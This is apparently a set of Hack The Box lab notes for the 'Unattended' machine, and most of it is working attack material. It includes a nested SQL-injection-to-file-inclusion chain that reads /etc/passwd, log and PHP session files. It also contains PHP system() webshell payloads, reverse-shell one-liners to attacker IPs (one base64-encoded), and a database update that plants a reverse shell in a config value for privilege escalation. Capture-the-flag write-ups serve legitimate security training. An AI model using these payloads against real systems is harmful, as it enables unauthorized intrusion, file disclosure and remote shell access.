```sql
$sql = "SELECT path from filepath where name = '".$tpl."'";


SELECT path from filepath where name = whatev UNION select /etc/passwd
```

Since whatev does not exist, the only return will be the path I passed, `/etc/passwd`.

```sql
25' union select "doesntmatter' union select '/etc/passwd' -- -" -- -
```

The first union select is for getTplFromID to return this string `"doesntmatter' union select '/etc/passwd' -- -"` for the second $sql as the param $tpl.


```url
https://www.nestedflanders.htb/index.php?id=25' union select "doesntmatter' union select '/etc/passwd' -- -" -- -

https://www.nestedflanders.htb/index.php?id=25' union select "doesntmatter' union select '/var/log/nginx/access.log' -- -" -- -

https://www.nestedflanders.htb/index.php?id=25' union select "doesntmatter' union select '/var/lib/php/sessions/sess_htjflf5t1ssuj9rihk80v3noj3' -- -" -- -
```

Get the session id from cookies

* https://academy.hackthebox.com/module/23/section/252 - File Inclusion

nginx access log is slightly better for resending it on browser. I need to put both cookies at the first time for the php session alternate method.

### Enum for Foothold
TCP ports that are allowed to make outbound connections through iptables

`<?php system('cat /etc/iptables/rules.v46'); ?>`

```bash
www-data@unattended:/home$ cat /etc/iptables/rules.v4
cat /etc/iptables/rules.v4
# Generated by iptables-save v1.6.0 on Fri Dec  1 05:54:27 2023
*filter
:INPUT DROP [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT DROP [42:2814]
-A INPUT -i lo -j ACCEPT
-A INPUT -i ens160 -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -i ens160 -p tcp -m multiport --dports 80,443 -j ACCEPT
-A INPUT -i ens160 -p icmp -j ACCEPT
-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -j DROP
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -o ens160 -m state --state RELATED,ESTABLISHED -j ACCEPT
-A OUTPUT -o ens160 -p tcp -m multiport --dports 80,443 -j ACCEPT
-A OUTPUT -o ens160 -p icmp -j ACCEPT
COMMIT
```

### Foothold
```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'
```

or php way directly

```php
echo -n 'bash -i >& /dev/tcp/10.10.16.32/4444 0>&1 &' | base64

<?php system('echo
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDMgMD4mMQ==| base64 -d|
bash'); ?>
```

### Enum
##### System Hardening
* https://linux-audit.com/linux-system-hardening-adding-hidepid-to-proc/
* https://0xdf.gitlab.io/2019/08/24/htb-unattended.html#system-hardening

### Shell as guly
```bash
MariaDB [neddy]> update config set option_value = "bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'" where id = 86;
<sh -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'" where id = 86;             
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [neddy]> select * from config where option_name = 'checkrelease'
select * from config where option_name = 'checkrelease'
    -> ;
;
+----+--------------+-----------------------------------------------------+
| id | option_name  | option_value                                        |
+----+--------------+-----------------------------------------------------+
| 86 | checkrelease | /home/guly/checkbase.pl;/home/guly/checkplugins.pl; |
+----+--------------+-----------------------------------------------------+
```

It run so fast that I got my shell first.

### Enum as guly
* https://wiki.debian.org/SystemGroups

```bash
guly@unattended:~$ groups
groups
guly cdrom floppy audio dip video plugdev grub netdev
guly@unattended:~$ find / -group grub 2>/dev/null
find / -group grub 2>/dev/null
/boot/initrd.img-4.9.0-13-amd64
/boot/initrd.img-4.9.0-8-amd64
/boot/initrd.img-4.19.0-25-amd64
```